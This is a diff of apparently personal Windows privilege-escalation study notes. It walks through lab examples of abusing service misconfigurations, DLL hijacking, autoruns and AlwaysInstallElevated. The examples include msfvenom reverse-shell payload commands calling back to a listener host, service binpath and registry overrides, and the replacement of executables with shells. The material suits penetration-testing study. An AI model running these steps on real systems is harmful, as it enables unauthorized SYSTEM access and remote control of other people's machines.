@@ -9,145 +9,176 @@ On Remote Machine run:
 copy \\ATTACKERIP\DIRECTORYMOUNTED\fileonattackermachine.txt . 
 
 Kernal Exploits
-  1. Enumerate Windows versions / patch level (systeminfo)
-  2. Find matching exploits (Google, ExploitDB, Github)
-  3. Compile and run
-  Kernel exploits can be unstable and can cause the system to crash, so use as last resort.
-  TIP!!!
-    You can use wesng tool to first check for kenel exploits
-    1. Run the systeminfo command and send the info to your attacker machine, then run wesng on that textfile
-    2. Precompiled Kernel Exploits can be found https://github.com/SecWiki/windows-kernel-exploits
-      a. It's easier to match with this than to compile your own.
-  EXAMPLE!!!
-    CVE-2018-8120 kernel exploit can run any program. You can run reverse.exe created by msfvenom for a reverse shell
+
+    1. Enumerate Windows versions / patch level (systeminfo)
+    2. Find matching exploits (Google, ExploitDB, Github)
+    3. Compile and run
+    Kernel exploits can be unstable and can cause the system to crash, so use as last resort.
+    TIP!!!
+      You can use wesng tool to first check for kenel exploits
+      1. Run the systeminfo command and send the info to your attacker machine, then run wesng on that textfile
+      2. Precompiled Kernel Exploits can be found https://github.com/SecWiki/windows-kernel-exploits
+        a. It's easier to match with this than to compile your own.
+    EXAMPLE!!!
+      CVE-2018-8120 kernel exploit can run any program. You can run reverse.exe created by msfvenom for a reverse shell
  
- Service Exploits
-  Query the config of a service
-    > sc.exe qc <name>
-  Query the current status of a service
-    > sc.exe query <name>
-  Modify a config option of a service
-    > sc.exe config <name> <option>= <value>
-  Start/Stop a service:
-    > net start/stop <name>
-   
-   5 Types of Service Misconfigurations
-   
-   1. Insecure Service Properties
-      a. Each service has an ACL which defines certain service-specific permissions
-      b. Some permissions are harmless (ex.SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS)
-      c. Some are useful (ex. SERVICE_STOP, SERVICE_START)
-      d. Some are dangerous (ex. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS)
-      If our user has permission to change the config of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.
-      accesschk.exe can check if a user can start and stop a service 
-      EXAMPLE!!! ("user" checking the "daclsvc" service)
-      1. Run winPEASany.exe on the system and found daclsvc was writable
-      2. .\accesschk.exe /accepteula -uwcqv user daclsvc (this will help check permissions on the file)
-      SERVICE_START
-      SERVICE_STOP
-      3. Next query the service 
-      sc qc daclsvc
-      "DEMAND_START" means to manually start the service
-      4. Check status of service 
-      sc query daclsvc
-      5. Change the config to a payload of our own, probably a reverse shell
-      sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
-      TIP!!!
-      If you can change a service config, but cannot stop/start it, you may not be able to escalate privileges
-   2. Unquoted Service Path
-      a. Windows will check if there are quotes on the service and run the filepath as arguments. We can take advantage of this.
-      EXAMPLE!!!
-      1. run winPEASany.exe on the system and found C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
-      2. run .\accesschk.exe /accepteula -ucqv unquotedsvc (this will help check permissions on the file)
-      SERVICE_START
-      SERVICE_STOP
-      3. run accesschk on each directory to find writable permissions
-      .\accesschk.exe /accepteula -uwdq C:\
-        RW BUILTIN\Administrators
-        RW NT AUTHORITY\SYSTEM
-      .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
-        RW BUILTIN\Administrators
-        RW NT AUTHORITY\SYSTEM
-      .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
-        RW BUILTIN\Administrators
-        RW NT AUTHORITY\SYSTEM
-        RW BUILTIN\Users  (We are apart of this group as a normal user!!!)
-       4. The next folder for this service is "\Common Files\", so we will make a reverse shell named "Common.exe" since Windows will check for "Common" as the next arg
-       copy reverse.exe "C:\PRogram Files\Unoquoted Path Service\Common.exe"
-       5. Start the service
-       net start unquotedsvc
-   3. Weak Registry Permissions
-      Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, we can possibly modify a service's config.
-      EXAMPLE!!!
-      1. winPEASany.exe found we can modify a service registry
-      HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
-      2.verify permissions via powershell or acchesschk (we are part of the Interactive group)
-      powershell -exec bypass
-      Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
-      .\accesschk.exe /accepteula -uvwqk HKLM\system\currentcontrolset\services\regsvc
-        RW NT AUTHORITY\INTERACTIVE
-            KEY_ALL_ACCESS
-      3. Use accesschk.exe to verify we can start the service
-      .\accesschk.exe /accepteula -ucqv user regsvc
-      SERVICE_START
-      SERVICE_STOP
-      4. Check current values in service registry entry
-      reg query HKLM\SYSTEM\CurrentControlSet\Services\regsvc
-      ImagePath REG_EXPAND_SZ "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
-      5. Override ImagePath Value to point to reverse shell via change binpath
-      reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
-      6. Start the service
-      net start regsvc
-   4. Insecure Service Executables
-      If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable
-      Always create a backup of the original executable in a real system
-      EXAMPLE!!!
-      1. Winpeas found  filepermsvc is writeable by everyone "C:\Program Files\File Permissions Service\filepermservice.exe"
-      2. Check with accesschk to verify we can write over it
-      .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
-        RW Everyone
+Service Exploits
+
+    Query the config of a service
+      > sc.exe qc <name>
+    Query the current status of a service
+      > sc.exe query <name>
+    Modify a config option of a service
+      > sc.exe config <name> <option>= <value>
+    Start/Stop a service:
+      > net start/stop <name>
+
+     5 Types of Service Misconfigurations
+
+     1. Insecure Service Properties
+        a. Each service has an ACL which defines certain service-specific permissions
+        b. Some permissions are harmless (ex.SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS)
+        c. Some are useful (ex. SERVICE_STOP, SERVICE_START)
+        d. Some are dangerous (ex. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS)
+        If our user has permission to change the config of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.
+        accesschk.exe can check if a user can start and stop a service 
+        EXAMPLE!!! ("user" checking the "daclsvc" service)
+        1. Run winPEASany.exe on the system and found daclsvc was writable
+        2. .\accesschk.exe /accepteula -uwcqv user daclsvc (this will help check permissions on the file)
+        SERVICE_START
+        SERVICE_STOP
+        3. Next query the service 
+        sc qc daclsvc
+        "DEMAND_START" means to manually start the service
+        4. Check status of service 
+        sc query daclsvc
+        5. Change the config to a payload of our own, probably a reverse shell
+        sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+        TIP!!!
+        If you can change a service config, but cannot stop/start it, you may not be able to escalate privileges
+     2. Unquoted Service Path
+        a. Windows will check if there are quotes on the service and run the filepath as arguments. We can take advantage of this.
+        EXAMPLE!!!
+        1. run winPEASany.exe on the system and found C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+        2. run .\accesschk.exe /accepteula -ucqv unquotedsvc (this will help check permissions on the file)
+        SERVICE_START
+        SERVICE_STOP
+        3. run accesschk on each directory to find writable permissions
+        .\accesschk.exe /accepteula -uwdq C:\
+          RW BUILTIN\Administrators
+          RW NT AUTHORITY\SYSTEM
+        .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
+          RW BUILTIN\Administrators
+          RW NT AUTHORITY\SYSTEM
+        .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+          RW BUILTIN\Administrators
+          RW NT AUTHORITY\SYSTEM
+          RW BUILTIN\Users  (We are apart of this group as a normal user!!!)
+         4. The next folder for this service is "\Common Files\", so we will make a reverse shell named "Common.exe" since Windows will check for "Common" as the next arg
+         copy reverse.exe "C:\PRogram Files\Unoquoted Path Service\Common.exe"
+         5. Start the service
+         net start unquotedsvc
+     3. Weak Registry Permissions
+        Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, we can possibly modify a service's config.
+        EXAMPLE!!!
+        1. winPEASany.exe found we can modify a service registry
+        HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
+        2.verify permissions via powershell or acchesschk (we are part of the Interactive group)
+        powershell -exec bypass
+        Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+        .\accesschk.exe /accepteula -uvwqk HKLM\system\currentcontrolset\services\regsvc
+          RW NT AUTHORITY\INTERACTIVE
+              KEY_ALL_ACCESS
+        3. Use accesschk.exe to verify we can start the service
+        .\accesschk.exe /accepteula -ucqv user regsvc
+        SERVICE_START
+        SERVICE_STOP
+        4. Check current values in service registry entry
+        reg query HKLM\SYSTEM\CurrentControlSet\Services\regsvc
+        ImagePath REG_EXPAND_SZ "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
+        5. Override ImagePath Value to point to reverse shell via change binpath
+        reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+        6. Start the service
+        net start regsvc
+     4. Insecure Service Executables
+        If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable
+        Always create a backup of the original executable in a real system
+        EXAMPLE!!!
+        1. Winpeas found  filepermsvc is writeable by everyone "C:\Program Files\File Permissions Service\filepermservice.exe"
+        2. Check with accesschk to verify we can write over it
+        .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+          RW Everyone
+              FILE_ALL_ACCESS
+        3. check if we can start the service
+        .\accesschk.exe /accepteula -uvqc filepermsvc
+        SERVICE_START
+        SERVICE_STOP
+        4. backup original executable
+        copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
+        5. overwrite executable with reverse shell
+        copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+        6. Start the service
+        net start filepermsvc
+     5. DLL Hijacking
+        Services will try to load funtionality from a library called a DLL. Whatever the funtionality the DLL provides will be executed with the same privileges as the service that loaded it.
+        If a DLL is loaded with an absolute path, we may be able to escalate privileges if the DLL is writable
+        If a DLL is missing from the system and we have write privileges to the directory within the PATH, we may be able to escalate privileges
+        Usually a very manual process
+        EXAMPLE!!!
+        1. winpeas detected (DLL Hijacking) C:\Temp: Authenticated Users [WriteData/CreateFiles] and non-Microsoft service dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"]
+        (to save time, we are only checking the dllsvc)
+        2. check both for start/stop access
+        .\accesschk.exe /accepteula -uvqc dllsvc
+        3. check for the .exe the service needs to run
+        sc qc dllsvc
+        4. Copy the .exe off the host and analyze it with a user with admin rights
+        Analyze with ProcMon64.exe
+          stop and clear the current capture
+          add the dllhijackservice.exe
+          remove registry and network activity filters
+        5. Start the service
+        net start dllsvc
+        6. Check Procmon activity
+        It is trying to find the file in the C:\Temp directory, which is writable by us.
+        7. Generate reverse shell with DLL format
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.201.129 LPORT=4444 -f dll -o hijackme.dll
+        copy it to the C:\Temp folder since Procmon found that it checks there.
+        6. Stop the service
+        net stop dllsvc
+        7. Start the service
+        net start dllsvc
+      
+ Registry Exploits
+ 
+     AutoRuns
+     Windows can be configured to run commands at startup. AutoRuns are configured in the Registry. If we can write to an AutoRun executable and have privileges to restart the machine, we may be able to escalate privileges
+     
+     EXAMPLE!!!
+     1. Winpeas found "C:\Program Files\Autorun Program\program.exe", FilePerms: Everyone [AllAccess]
+     2. use accesschk to verify permissions on the .exe
+     .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+      RW Everyone
             FILE_ALL_ACCESS
-      3. check if we can start the service
-      .\accesschk.exe /accepteula -uvqc filepermsvc
-      SERVICE_START
-      SERVICE_STOP
-      4. backup original executable
-      copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
-      5. overwrite executable with reverse shell
-      copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
-      6. Start the service
-      net start filepermsvc
-   5. DLL Hijacking
-      Services will try to load funtionality from a library called a DLL. Whatever the funtionality the DLL provides will be executed with the same privileges as the service that loaded it.
-      If a DLL is loaded with an absolute path, we may be able to escalate privileges if the DLL is writable
-      If a DLL is missing from the system and we have write privileges to the directory within the PATH, we may be able to escalate privileges
-      Usually a very manual process
+     3. Make backup of original .exe
+     copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
+     4. Copy reverse shell into the old .exe file
+     copy /Y reverse4444.exe "C:\Program Files\Autorun Program\program.exe"
+     5. Setup listener
+     6. Restart Windows
+     shutdown -r (may take a while to shutdown)
+      
+     AlwaysInstallElevated 
+     MSI files are package files used to install apps. These files run with permission of user trying to install them. These can be run with elevated privileges like admin. We can possibly generate malicious MSI files that have a reverse shell.
+      The catch is that two Registry settings must be enabled for this to work. "AlwaysInstallElevated" value must be set to 1 for both local machine and the current user. HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer and HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer. If either are missing/disabled the exploit won't work.
       EXAMPLE!!!
-      1. winpeas detected (DLL Hijacking) C:\Temp: Authenticated Users [WriteData/CreateFiles] and non-Microsoft service dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"]
-      (to save time, we are only checking the dllsvc)
-      2. check both for start/stop access
-      .\accesschk.exe /accepteula -uvqc dllsvc
-      3. check for the .exe the service needs to run
-      sc qc dllsvc
-      4. Copy the .exe off the host and analyze it with a user with admin rights
-      Analyze with ProcMon64.exe
-        stop and clear the current capture
-        add the dllhijackservice.exe
-        remove registry and network activity filters
-      5. Start the service
-      net start dllsvc
-      6. Check Procmon activity
-      It is trying to find the file in the C:\Temp directory, which is writable by us.
-      7. Generate reverse shell with DLL format
-      msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.201.129 LPORT=4444 -f dll -o hijackme.dll
-      copy it to the C:\Temp folder since Procmon found that it checks there.
-      6. Stop the service
-      net stop dllsvc
-      7. Start the service
-      net start dllsvc
-      
-      
-      
-      
-      
+      1. winpeas found Checking AlwaysInstallElevated(T1012), AlwaysInstallElevated set to 1 in HKLM!, AlwaysInstallElevated set to 1 in HKCU!
+      2. verify by querying the keys
+      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+      3. create new MSI reverse shell.
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.201.129 LPORT=4444 -f msi -o reverse.msi
+      4. startup listener
+      5. copy file to machine and run it
+      msiexec /quiet /qn /i reverse.msi
+
       
